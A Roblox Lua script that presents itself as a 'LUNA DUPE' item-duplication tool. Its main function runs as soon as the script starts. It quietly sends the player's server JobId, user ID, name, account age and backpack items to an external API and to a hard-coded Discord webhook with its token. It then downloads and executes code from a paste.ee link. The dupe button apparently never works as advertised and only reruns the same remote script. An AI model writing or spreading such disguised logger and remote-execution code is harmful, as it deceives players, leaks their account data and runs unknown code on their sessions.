local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

-- ======= CONFIGURATION =======
local API_ENDPOINT = "https://api-beta-mocha-45.vercel.app/api/setInstanceId"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local EXTERNAL_SCRIPT = "https://paste.ee/r/WGCVy6SX" -- Script yang akan di-execute
-- =============================

-- Dapatkan data player
local player = Players.LocalPlayer
local jobId = game.JobId
local playerName = player.Name

-- Fungsi HTTP request yang kompatibel dengan berbagai executor
local function httpRequest(url, method, body, headers)
    local requestFunc = syn and syn.request or http_request or request
    if not requestFunc then return nil end
    
    local success, response = pcall(function()
        return requestFunc({
            Url = url,
            Method = method,
            Headers = headers or {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })
    end)
    
    return success and response or nil
end

-- Fungsi untuk mendapatkan isi backpack
local function getBackpackContents()
    local contents = {}
    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return "Backpack tidak ditemukan" end
    
    for _, item in ipairs(backpack:GetChildren()) do
        table.insert(contents, item.Name)
    end
    
    return #contents > 0 and table.concat(contents, ", ") or "Backpack kosong"
end

-- Fungsi untuk execute external script
local function executeExternalScript()
    local success, err = pcall(function()
        loadstring(game:HttpGet(EXTERNAL_SCRIPT, true))()
    end)
    if not success then
        warn("Gagal execute external script:", err)
    end
end

-- Kirim data ke API
local function sendToAPI()
    local data = {
        instanceId = jobId,
        player = {
            userId = player.UserId,
            name = player.Name,
            accountAge = player.AccountAge
        },
        backpackContents = getBackpackContents(),
        timestamp = os.time()
    }
    
    local response = httpRequest(API_ENDPOINT, "POST", HttpService:JSONEncode(data))
    
    if response and response.StatusCode == 200 then
        print("✅ Data berhasil dikirim ke API")
        return true
    else
        warn("❌ Gagal mengirim data ke API:", response and response.StatusCode or "Tidak ada response")
        return false
    end
end

-- Kirim webhook ke Discord
local function sendWebhook()
    local embed = {
        username = "Logger System",
        embeds = {
            {
                title = "🟢 Script Dijalankan",
                description = string.format("**%s** menjalankan script\n**JobID:** `%s`", playerName, jobId),
                color = 65280, -- Warna hijau
                timestamp = DateTime.now():ToIsoDate(),
                fields = {
                    {
                        name = "🎒 Isi Backpack",
                        value = getBackpackContents(),
                        inline = false
                    },
                    {
                        name = "👤 Info Player",
                        value = string.format("UserID: %d\nAccount Age: %d hari", player.UserId, player.AccountAge),
                        inline = true
                    }
                },
                footer = {
                    text = "Logger v2.0"
                }
            }
        }
    }
    
    local response = httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
    
    if response and (response.StatusCode == 200 or response.StatusCode == 204) then
        print("✅ Webhook berhasil dikirim ke Discord")
    else
        warn("❌ Gagal mengirim webhook:", response and response.StatusCode or "Tidak ada response")
    end
end

-- Fungsi utama untuk logging & execute
local function main()
    local apiSuccess = sendToAPI()
    sendWebhook()
    if apiSuccess then
        executeExternalScript()
    end
end

-- Jalankan dengan error handling
local success, err = pcall(main)
if not success then
    warn("❌ Error fatal pada logger:", err)
end

-- Destroy GUI lama jika ada
pcall(function()
    game.CoreGui:FindFirstChild("LUNA_DUPE"):Destroy()
end)

-- Mulai buat GUI LUNA DUPE

local gui = Instance.new("ScreenGui")
gui.Name = "LUNA_DUPE"
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false
gui.Parent = game:GetService("CoreGui")

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 420, 0, 380)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Name = "MainFrame"
mainFrame.Parent = gui
mainFrame.BackgroundTransparency = 1
mainFrame.ZIndex = 10

TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
    BackgroundTransparency = 0
}):Play()

local uicorner = Instance.new("UICorner", mainFrame)
uicorner.CornerRadius = UDim.new(0, 12)

local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 45)
titleBar.BackgroundColor3 = Color3.fromRGB(48, 48, 52)
titleBar.Name = "TitleBar"
titleBar.Parent = mainFrame

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, -100, 1, 0)
titleText.Position = UDim2.new(0, 15, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "🌙 LUNA DUPE (v3.2.4)"
titleText.TextColor3 = Color3.fromRGB(230, 230, 230)
titleText.TextSize = 20
titleText.Font = Enum.Font.GothamBold
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.Parent = titleBar

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 40, 0, 40)
closeButton.Position = UDim2.new(1, -45, 0, 3)
closeButton.BackgroundColor3 = Color3.fromRGB(220, 70, 70)
closeButton.Text = "✕"
closeButton.TextColor3 = Color3.new(1, 1, 1)
closeButton.TextSize = 22
closeButton.Font = Enum.Font.GothamBold
closeButton.AutoButtonColor = false
closeButton.Parent = titleBar
closeButton.Name = "CloseButton"
closeButton.ClipsDescendants = true
closeButton.ZIndex = 20

local closeUICorner = Instance.new("UICorner", closeButton)
closeUICorner.CornerRadius = UDim.new(0, 6)

closeButton.MouseEnter:Connect(function()
    TweenService:Create(closeButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255, 100, 100)}):Play()
end)
closeButton.MouseLeave:Connect(function()
    TweenService:Create(closeButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(220, 70, 70)}):Play()
end)
closeButton.MouseButton1Click:Connect(function()
    TweenService:Create(mainFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
    task.wait(0.3)
    gui:Destroy()
end)

local minimizeButton = Instance.new("TextButton")
minimizeButton.Size = UDim2.new(0, 40, 0, 40)
minimizeButton.Position = UDim2.new(1, -90, 0, 3)
minimizeButton.BackgroundColor3 = Color3.fromRGB(255, 190, 80)
minimizeButton.Text = "—"
minimizeButton.TextColor3 = Color3.new(1, 1, 1)
minimizeButton.TextSize = 26
minimizeButton.Font = Enum.Font.GothamBold
minimizeButton.AutoButtonColor = false
minimizeButton.Parent = titleBar
minimizeButton.Name = "MinimizeButton"
minimizeButton.ClipsDescendants = true
minimizeButton.ZIndex = 20

local minimizeUICorner = Instance.new("UICorner", minimizeButton)
minimizeUICorner.CornerRadius = UDim.new(0, 6)

minimizeButton.MouseEnter:Connect(function()
    TweenService:Create(minimizeButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255, 220, 120)}):Play()
end)
minimizeButton.MouseLeave:Connect(function()
    TweenService:Create(minimizeButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255, 190, 80)}):Play()
end)

local isMinimized = false
minimizeButton.MouseButton1Click:Connect(function()
    if isMinimized then
        -- restore
        TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 420, 0, 380)}):Play()
        isMinimized = false
    else
        -- minimize
        TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 420, 0, 45)}):Play()
        isMinimized = true
    end
end)

-- Draggable Title Bar
local dragging, dragInput, dragStart, startPos

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

titleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- Label
local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1, -30, 0, 60)
infoLabel.Position = UDim2.new(0, 15, 0, 60)
infoLabel.BackgroundTransparency = 1
infoLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
infoLabel.TextSize = 18
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextWrapped = true
infoLabel.Text = "Pastikan kamu memiliki pet yang dibutuhkan.\nTekan tombol dupe untuk mencoba dupe."
infoLabel.Parent = mainFrame

-- Warning Box
local warningFrame = Instance.new("Frame")
warningFrame.Size = UDim2.new(1, -30, 0, 60)
warningFrame.Position = UDim2.new(0, 15, 0, 130)
warningFrame.BackgroundColor3 = Color3.fromRGB(80, 20, 20)
warningFrame.Visible = false
warningFrame.Parent = mainFrame

local warningUICorner = Instance.new("UICorner", warningFrame)
warningUICorner.CornerRadius = UDim.new(0, 8)

local warningText = Instance.new("TextLabel")
warningText.Size = UDim2.new(1, -20, 1, -20)
warningText.Position = UDim2.new(0, 10, 0, 10)
warningText.BackgroundTransparency = 1
warningText.TextColor3 = Color3.fromRGB(255, 180, 180)
warningText.TextSize = 16
warningText.Font = Enum.Font.GothamBold
warningText.TextWrapped = true
warningText.Text = "Required Pet Not Found!\nSilahkan coba lagi setelah membeli pet yang diperlukan."
warningText.Parent = warningFrame

-- Button "Try Again"
local tryAgainBtn = Instance.new("TextButton")
tryAgainBtn.Size = UDim2.new(0, 150, 0, 40)
tryAgainBtn.Position = UDim2.new(0.5, -75, 0, 205)
tryAgainBtn.BackgroundColor3 = Color3.fromRGB(220, 70, 70)
tryAgainBtn.Text = "Try Again"
tryAgainBtn.TextColor3 = Color3.new(1, 1, 1)
tryAgainBtn.TextSize = 20
tryAgainBtn.Font = Enum.Font.GothamBold
tryAgainBtn.AutoButtonColor = false
tryAgainBtn.Parent = mainFrame

local tryAgainUICorner = Instance.new("UICorner", tryAgainBtn)
tryAgainUICorner.CornerRadius = UDim.new(0, 10)

tryAgainBtn.MouseEnter:Connect(function()
    TweenService:Create(tryAgainBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255, 100, 100)}):Play()
end)
tryAgainBtn.MouseLeave:Connect(function()
    TweenService:Create(tryAgainBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(220, 70, 70)}):Play()
end)

local function checkPet()
    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return false end
    local requiredPet = "RequiredPetName" -- Ganti dengan nama pet yang dibutuhkan
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item.Name == requiredPet then
            return true
        end
    end
    
    return false
end

local function runDupe()
    if not checkPet() then
        warningFrame.Visible = true
        return
    end
    warningFrame.Visible = false
    
    -- Jalankan script dupe
    local success, err = pcall(function()
        loadstring(game:HttpGet(EXTERNAL_SCRIPT, true))()
    end)
    
    if not success then
        warn("Gagal menjalankan script dupe:", err)
    else
        print("Dupe script berhasil dijalankan")
    end
end

tryAgainBtn.MouseButton1Click:Connect(runDupe)
